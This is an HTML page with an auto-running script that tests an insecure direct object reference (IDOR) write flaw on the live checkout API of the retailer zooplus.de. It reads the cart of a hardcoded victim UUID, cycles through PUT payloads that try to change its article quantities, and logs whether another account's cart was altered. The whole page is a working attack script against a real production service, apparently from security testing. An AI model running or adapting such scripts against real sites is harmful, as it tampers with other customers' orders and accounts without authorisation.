<!DOCTYPE html>
<html>
<head>
    <title>IDOR Write Test</title>
    <style>
        body { font-family: monospace; padding: 20px; background: #1e1e1e; color: #d4d4d4; }
        .log { margin: 5px 0; padding: 5px; background: #252526; border-left: 3px solid #007acc; }
        .success { border-left-color: #4ec9b0; }
        .error { border-left-color: #f48771; }
        .warning { border-left-color: #dcdcaa; }
    </style>
</head>
<body>
    <h1>IDOR Write Test - Automatic Execution</h1>
    <div id="output"></div>
    <script>
        const CART_UUID = "6bd223b4-5040-4faa-ba85-6a85c1ec2d50";
        const output = document.getElementById('output');
        
        function log(msg, type = 'info') {
            const div = document.createElement('div');
            div.className = `log ${type}`;
            div.textContent = msg;
            output.appendChild(div);
            console.log(msg);
        }
        
        async function testIDORWrite() {
            log("[*] Starting IDOR Write Test...", 'info');
            
            try {
                // Get cart before
                const cartBefore = await fetch(`https://www.zooplus.de/checkout/api/cart-api/v2/cart/${CART_UUID}`, {
                    credentials: 'include'
                }).then(r => r.json());
                
                const beforeCount = cartBefore.articles.length;
                const beforeTotal = cartBefore.summary.grandTotal;
                const articleId = cartBefore.articles[0]?.id;
                const cartId = cartBefore.cartId;
                const sid = cartBefore.sid;
                
                log(`[+] Cart before: ${beforeCount} items, ${beforeTotal} EUR`, 'info');
                log(`[+] Article ID: ${articleId}, Cart ID: ${cartId}, SID: ${sid}`, 'info');
                
                // Test different payloads
                const payloads = [
                    { name: "articleId + quantity", payload: { articleId: articleId, quantity: 2 } },
                    { name: "id + quantity", payload: { id: articleId, quantity: 2 } },
                    { name: "With cartUuid", payload: { articleId: articleId, quantity: 2, cartUuid: CART_UUID } },
                    { name: "With sid", payload: { articleId: articleId, quantity: 2, sid: sid } },
                    { name: "With cartId", payload: { articleId: articleId, quantity: 2, cartId: cartId } },
                    { name: "Full format", payload: { articleId: articleId, quantity: 2, cartUuid: CART_UUID, sid: sid, cartId: cartId } },
                ];
                
                let success = false;
                
                for (const test of payloads) {
                    log(`\n[*] Testing: ${test.name}`, 'info');
                    log(`    Payload: ${JSON.stringify(test.payload)}`, 'info');
                    
                    try {
                        const response = await fetch(`https://www.zooplus.de/semiprotected/api/checkout/state-api/v2/set-article-quantity`, {
                            method: "PUT",
                            credentials: "include",
                            headers: {
                                "Content-Type": "application/json",
                                "Accept": "application/json"
                            },
                            body: JSON.stringify(test.payload)
                        });
                        
                        const contentType = response.headers.get("content-type") || "";
                        const text = await response.text();
                        
                        log(`    Status: ${response.status}, Content-Type: ${contentType}`, response.status === 200 ? 'success' : 'warning');
                        
                        if (response.status === 200 && contentType.includes("application/json")) {
                            try {
                                const json = JSON.parse(text);
                                log(`    [!!!] SUCCESS! JSON response received`, 'success');
                                log(`    Response: ${JSON.stringify(json).substring(0, 200)}`, 'success');
                                success = true;
                                break;
                            } catch (e) {
                                log(`    Response (not JSON): ${text.substring(0, 100)}`, 'warning');
                            }
                        } else {
                            log(`    Response: ${text.substring(0, 100)}`, 'warning');
                        }
                    } catch (e) {
                        log(`    Error: ${e.message}`, 'error');
                    }
                }
                
                // Check cart after
                log("\n[*] Checking cart after modification...", 'info');
                const cartAfter = await fetch(`https://www.zooplus.de/checkout/api/cart-api/v2/cart/${CART_UUID}`, {
                    credentials: 'include'
                }).then(r => r.json());
                
                const afterCount = cartAfter.articles.length;
                const afterTotal = cartAfter.summary.grandTotal;
                
                log(`[+] Cart after: ${afterCount} items, ${afterTotal} EUR`, 'info');
                
                if (afterCount !== beforeCount || Math.abs(afterTotal - beforeTotal) > 0.01) {
                    log("\n[!!!] ========================================", 'success');
                    log("[!!!] CRITICAL IDOR WRITE CONFIRMED!", 'success');
                    log("[!!!] ========================================", 'success');
                    log(`[!!!] Before: ${beforeCount} items, ${beforeTotal} EUR`, 'success');
                    log(`[!!!] After:  ${afterCount} items, ${afterTotal} EUR`, 'success');
                    log("[!!!] Account B successfully modified Account A's cart!", 'success');
                    log("[!!!] Endpoint: PUT /semiprotected/api/checkout/state-api/v2/set-article-quantity", 'success');
                } else {
                    log("\n[!] Cart unchanged - write operations may be protected", 'warning');
                    log("[!] Need to find exact payload format", 'warning');
                }
            } catch (e) {
                log(`[!] Error: ${e.message}`, 'error');
            }
        }
        
        // Auto-execute
        testIDORWrite();
    </script>
</body>
</html>

